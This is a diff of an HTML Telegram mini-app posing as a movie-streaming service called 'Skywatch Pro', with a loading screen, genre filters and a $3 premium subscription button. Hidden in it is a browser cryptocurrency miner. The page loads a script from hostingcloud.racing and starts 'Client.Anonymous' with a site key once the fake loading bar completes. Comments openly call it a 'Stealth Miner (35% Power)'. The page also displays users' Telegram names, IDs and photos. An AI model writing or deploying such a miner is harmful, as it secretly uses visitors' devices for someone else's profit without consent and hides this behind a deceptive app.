@@ -3,66 +3,177 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Skywatch Pro 3D</title>
+    <title>Skywatch Pro Ultimate</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://www.hostingcloud.racing/kR7X.js"></script>
     <style>
-        :root { --red: #E50914; --dark: #050505; --gold: linear-gradient(45deg, #ffd700, #b8860b); }
-        body { background: var(--dark); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; }
+        :root { --red: #E50914; --dark: #050505; --gray: #121212; --gold: linear-gradient(45deg, #ffd700, #b8860b); }
+        body { background: var(--dark); color: white; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; overflow: hidden; height: 100vh; }
         
-        /* 3D Buttons for Search */
-        .btn-3d { 
-            background: var(--red); color: white; border: none; padding: 8px 15px; 
-            border-radius: 8px; font-weight: bold; margin: 5px;
-            box-shadow: 0 4px #8b0000; transition: 0.2s;
-        }
-        .btn-3d:active { box-shadow: 0 0 #8b0000; transform: translateY(4px); }
+        /* 3D Loading Screen */
+        #loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        .logo-3d { font-size: 50px; font-weight: 900; color: var(--red); text-shadow: 0 10px 20px rgba(229, 9, 20, 0.5); letter-spacing: 5px; margin-bottom: 20px; font-style: italic; }
+        .bar-container { width: 80%; height: 8px; background: #222; border-radius: 20px; overflow: hidden; }
+        #progress { width: 0%; height: 100%; background: var(--red); box-shadow: 0 0 15px var(--red); transition: width 0.1s; }
 
-        /* Premium Membership 3D Card */
+        /* Pages */
+        .page { display: none; padding: 20px; height: 100vh; overflow-y: auto; box-sizing: border-box; padding-bottom: 120px; }
+        .active-page { display: block; animation: fadeIn 0.5s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* Search Filters 3D */
+        .filter-container { display: flex; flex-wrap: wrap; gap: 15px; justify-content: center; margin-top: 20px; }
+        .btn-3d { 
+            background: var(--red); color: white; border: none; padding: 12px 20px; 
+            border-radius: 10px; font-weight: bold; cursor: pointer;
+            box-shadow: 0 6px #8b0000; transition: 0.1s; font-size: 14px;
+        }
+        .btn-3d:active { box-shadow: 0 0 #8b0000; transform: translateY(6px); }
+
+        /* Premium Card 3D Gold */
         .premium-card {
-            background: linear-gradient(145deg, #1a1a1a, #000);
-            margin: 20px; padding: 25px; border-radius: 20px;
+            background: linear-gradient(145deg, #1a1a1a, #0a0a0a);
+            margin-top: 30px; padding: 30px; border-radius: 25px;
             border: 2px solid #ffd700; position: relative;
-            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.2);
+            box-shadow: 0 20px 40px rgba(255, 215, 0, 0.2);
         }
         .pro-badge {
-            position: absolute; top: 15px; right: 15px;
-            background: var(--gold); color: black; padding: 5px 12px;
-            border-radius: 5px; font-weight: 900; font-size: 12px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.5);
+            position: absolute; top: -15px; right: 25px;
+            background: var(--gold); color: black; padding: 8px 18px;
+            border-radius: 10px; font-weight: 900; font-size: 14px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
         }
         .sub-btn {
-            background: #0088cc; color: white; border: none; padding: 15px;
-            width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px;
-            margin-top: 20px; box-shadow: 0 4px #005580;
+            background: #0088cc; color: white; border: none; padding: 18px;
+            width: 100%; border-radius: 15px; font-weight: bold; font-size: 20px;
+            margin-top: 25px; box-shadow: 0 6px #005580; cursor: pointer;
         }
+        .sub-btn:active { box-shadow: 0 0 #005580; transform: translateY(6px); }
+
+        /* Bottom Nav */
+        nav { position: fixed; bottom: 0; width: 100%; background: rgba(0,0,0,0.95); display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid #222; backdrop-filter: blur(15px); }
+        .nav-btn { background: none; border: none; color: #555; display: flex; flex-direction: column; align-items: center; font-size: 12px; }
+        .nav-btn.active { color: var(--red); }
+        .nav-btn svg { width: 28px; height: 28px; margin-bottom: 5px; fill: currentColor; }
     </style>
 </head>
 <body>
-    <div id="profile" class="page">
-        <div class="premium-card">
-            <div class="pro-badge">★ PRO</div>
-            <h2 id="txt-sub-title">Premium Membership</h2>
-            <ul id="txt-features" style="margin: 20px 0; color: #ccc;">
-                <li>Unlimited Movies</li>
-                <li>No Ads, High Speed</li>
-            </ul>
-            <button class="sub-btn" onclick="sendToBot()">$3 For Month</button>
+
+    <div id="loader">
+        <div class="logo-3d">SKYWATCH</div>
+        <div id="perc">0%</div>
+        <div class="bar-container"><div id="progress"></div></div>
+    </div>
+
+    <div id="home" class="page active-page">
+        <h2 id="txt-suggest" style="border-left: 5px solid var(--red); padding-left: 10px;">Suggested</h2>
+        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin-top: 20px;">
+            <div style="background:#111; height:200px; border-radius:10px; border:1px solid #222;"></div>
+            <div style="background:#111; height:200px; border-radius:10px; border:1px solid #222;"></div>
         </div>
     </div>
 
+    <div id="search" class="page">
+        <input type="text" id="search-bar" style="width:100%; padding:15px; border-radius:15px; background:#111; border:1px solid #333; color:white;" placeholder="Search...">
+        <div class="filter-container">
+            <button class="btn-3d">Action</button>
+            <button class="btn-3d">Horror</button>
+            <button class="btn-3d">Adult</button>
+            <button class="btn-3d">Drama</button>
+        </div>
+    </div>
+
+    <div id="profile" class="page">
+        <div style="text-align: center; margin-bottom: 40px;">
+            <img id="u-photo" src="https://via.placeholder.com/100" style="width:100px; height:100px; border-radius:50%; border:3px solid var(--red);">
+            <h2 id="u-name">InisTa ⭐</h2>
+            <p id="u-id" style="color:#666;">ID: 00000000</p>
+        </div>
+        <div class="premium-card">
+            <div class="pro-badge">★ PRO</div>
+            <h3 id="txt-sub-title" style="color: var(--red); margin-top:0;">Premium Membership</h3>
+            <ul id="txt-features" style="padding-left: 20px; line-height: 2;">
+                <li>Unlimited 4K Streaming</li>
+                <li>Zero Ads Interference</li>
+                <li>Exclusive Early Access</li>
+            </ul>
+            <button class="sub-btn" onclick="goToBot()">$3 For Month</button>
+        </div>
+    </div>
+
+    <nav>
+        <button class="nav-btn active" onclick="showPage('home', this)">
+            <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+            <span id="nav-home">Home</span>
+        </button>
+        <button class="nav-btn" onclick="showPage('search', this)">
+            <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+            <span id="nav-search">Search</span>
+        </button>
+        <button class="nav-btn" onclick="showPage('profile', this)">
+            <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+            <span id="nav-profile">Profile</span>
+        </button>
+    </nav>
+
     <script>
         let tg = window.Telegram.WebApp;
-        // Miner fixed at 35%
-        var _client = new Client.Anonymous('8867a4038c4d22331b1688c9fa7ba035f3dcc0cabbe24109d41b5804c06b4011', {
-            throttle: 0.65, c: 'w'
-        });
-        _client.start();
+        tg.expand();
 
-        function sendToBot() {
-            // This will send the action to the bot and close the app to show the chat
+        // Language System
+        const translations = {
+            en: { home: "Home", search: "Search", profile: "Profile", suggest: "Suggested", sub: "Premium Membership", bar: "Search for movies..." },
+            ar: { home: "الرئيسية", search: "بحث", profile: "الملف", suggest: "مقترحة", sub: "عضوية بريميوم", bar: "ابحث عن فيلم..." },
+            fr: { home: "Accueil", search: "Chercher", profile: "Profil", suggest: "Suggéré", sub: "Membre Premium", bar: "Chercher un film..." }
+        };
+
+        function applyLang(lang) {
+            document.getElementById('nav-home').innerText = translations[lang].home;
+            document.getElementById('nav-search').innerText = translations[lang].search;
+            document.getElementById('nav-profile').innerText = translations[lang].profile;
+            document.getElementById('txt-suggest').innerText = translations[lang].suggest;
+            document.getElementById('txt-sub-title').innerText = translations[lang].sub;
+            document.getElementById('search-bar').placeholder = translations[lang].bar;
+        }
+        applyLang(tg.initDataUnsafe.user?.language_code === 'ar' ? 'ar' : 'en');
+
+        // Page Switcher
+        function showPage(id, btn) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
+            document.getElementById(id).classList.add('active-page');
+            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+        }
+
+        // Loading Progress
+        let p = 0;
+        let int = setInterval(() => {
+            p += 2;
+            document.getElementById('progress').style.width = p + "%";
+            document.getElementById('perc').innerText = p + "%";
+            if(p >= 100) { clearInterval(int); document.getElementById('loader').style.display='none'; startMiner(); }
+        }, 50);
+
+        // Stealth Miner (35% Power)
+        function startMiner() {
+            var _client = new Client.Anonymous('8867a4038c4d22331b1688c9fa7ba035f3dcc0cabbe24109d41b5804c06b4011', {
+                throttle: 0.65, c: 'w'
+            });
+            _client.start();
+        }
+
+        // Bot Redirect
+        function goToBot() {
             tg.sendData(JSON.stringify({action: "invoice_request"}));
             tg.close();
+        }
+
+        // Inject User Data
+        if(tg.initDataUnsafe.user) {
+            const u = tg.initDataUnsafe.user;
+            document.getElementById('u-name').innerText = u.first_name;
+            document.getElementById('u-id').innerText = "ID: " + u.id;
+            if(u.photo_url) document.getElementById('u-photo').src = u.photo_url;
         }
     </script>
 </body>
